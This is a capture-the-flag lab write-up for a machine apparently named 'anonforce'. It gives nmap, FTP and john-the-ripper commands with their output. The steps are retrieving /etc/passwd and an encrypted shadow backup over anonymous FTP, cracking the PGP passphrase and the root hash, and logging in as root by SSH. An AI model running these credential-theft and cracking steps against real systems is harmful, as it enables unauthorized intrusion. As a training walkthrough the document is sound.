# IP
10.10.227.214

## Enumeration

### Nmap
Found 2 ports running on the machine
```console
❯ nmap -sC -sV  -p- -vvv 10.10.227.214  --min-rate=700 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-07 18:00 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Initiating Ping Scan at 18:00
Scanning 10.10.227.214 [2 ports]
Completed Ping Scan at 18:00, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:00
Completed Parallel DNS resolution of 1 host. at 18:00, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:00
Scanning 10.10.227.214 [65535 ports]
Discovered open port 22/tcp on 10.10.227.214
Discovered open port 21/tcp on 10.10.227.214
Connect Scan Timing: About 31.87% done; ETC: 18:02 (0:01:06 remaining)
Connect Scan Timing: About 63.46% done; ETC: 18:02 (0:00:35 remaining)
Completed Connect Scan at 18:02, 95.48s elapsed (65535 total ports)
Initiating Service scan at 18:02
Scanning 2 services on 10.10.227.214
Completed Service scan at 18:02, 0.32s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.227.214.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:02
NSE: [ftp-bounce 10.10.227.214:21] PORT response: 500 Illegal PORT command.
Completed NSE at 18:02, 4.65s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:02
Completed NSE at 18:02, 1.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:02
Completed NSE at 18:02, 0.00s elapsed
Nmap scan report for 10.10.227.214
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-11-07 18:00:52 IST for 102s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.0.215
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Nov 07 04:05 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   93 0        0               0 Nov 07 04:05 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Nov 07 04:06 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Nov 07 04:05 sys
| drwxrwxrwt    9 0        0            4096 Nov 07 04:17 tmp [NSE: writeable]
| drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
| drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
| lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
|_lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkGQ8G5TDLFJY+zMp5dEj6XUwoH7ojGBjGkOmAf6d9PuIsf4DPFJQmoCA/eiSZpIwfQ14hVhXJHTclmcCd+2OeriuLXq0fEn+aHTo5X82KADkJibmel86qS7ToCzcaROnUkJU17mY3MuyTbfxuqmSvTv/7NI0zRW+cJ+cqwmeSZyhLnOHZ9GT5Y3Lbpvt2w0ktQ128POyaO4GrGA0EERWstIxExpqLaLsqjQPE/hBnIgZXZjd6EL1gn1/CSQnJVdLesIWMcvT5qnm9dZn/ysvysdHHaHylCSKIx5Qu9LtsitssoglpDlhXu5kr2do6ncWMAdTW75asBh+VE+QVX3vV
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAq1VuleOFZpJb73D/25H1l0wp9Cs/SGwWIjwtGW0/2/20+xMsac5E8rACtXtLaAuL3Dk/IRSrORuEfU11R0H3A=
|   256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiId/YCdJZgD4/DG314U2CpAu8Y13DAx7AQ+JX+3zVc
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:02
Completed NSE at 18:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:02
Completed NSE at 18:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:02
Completed NSE at 18:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.62 seconds
```

### FTP
- Logged into ftp as `Anonymous:123`
- Found `user.txt`

```console
❯ ftp 10.10.227.214
Connected to 10.10.227.214.
220 (vsFTPd 3.0.3)
Name (10.10.227.214:divu050704): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48099|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Nov 07 04:05 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   91 0        0               0 Nov 07 04:05 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Nov 07 04:06 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Nov 07 04:05 sys
drwxrwxrwt    9 0        0            4096 Nov 07 04:17 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> cd /home
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||62280|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||59183|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
```
## Exploitation

### Privilege Escalation

- In the `/` directory there is a `notread` directory.

```console
ftp> ls
229 Entering Extended Passive Mode (|||56367|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Nov 07 04:05 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   91 0        0               0 Nov 07 04:05 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Nov 07 04:06 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Nov 07 04:05 sys
drwxrwxrwt    9 0        0            4096 Nov 07 04:17 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
```
- In this directory there is `pgp` file with its private key.

```console
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||26595|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||27061|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |***********************************************|   524       10.86 MiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (3.52 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||32296|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |***********************************************|  3762       67.69 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (25.05 KiB/s)
```

- Cracked this private key with john-the-ripper and found passphrase for the pgp to be `xbox360`.

```console
❯ gpg2john private.asc > pgp_hash

File private.asc
❯ john pgp_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)
1g 0:00:00:00 DONE (2022-11-07 18:28) 4.545g/s 4227p/s 4227c/s 4227C/s xbox360..sheena
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- Decrypted to `backup.pgp`

```console
❯ gpg backup.pgp
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
❯ cat backup
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::%
```
- This looks like a shadow file
- Downloaded passwd  file from machine 

```console
ftp> cd /etc
250 Directory successfully changed.
ftp> get passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||33858|)
150 Opening BINARY mode data connection for passwd (1524 bytes).
100% |***********************************************|  1524      478.70 KiB/s    00:00 ETA
226 Transfer complete.
1524 bytes received in 00:00 (9.84 KiB/s)
```

- `unshadow` the  file.

```console
❯ unshadow passwd backup > ssh_hash
❯ ls
backup  backup.pgp  nmap.log  passwd  pgp_hash  private.asc  ssh_hash  user.txt
```

- Cracked the hash

```console
❯ john ssh_hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)
1g 0:00:00:07 DONE (2022-11-07 18:32) 0.1322g/s 914.2p/s 914.2c/s 914.2C/s 98765432..better
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Secure shelled to the machine as root

```console
❯ ssh root@10.10.227.214
root@10.10.227.214's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Mon Nov  7 04:44:05 2022 from 10.17.0.215
root@ubuntu:~# cat /root/root.txt
f706456440c7af4187810c31c6cebdce

```



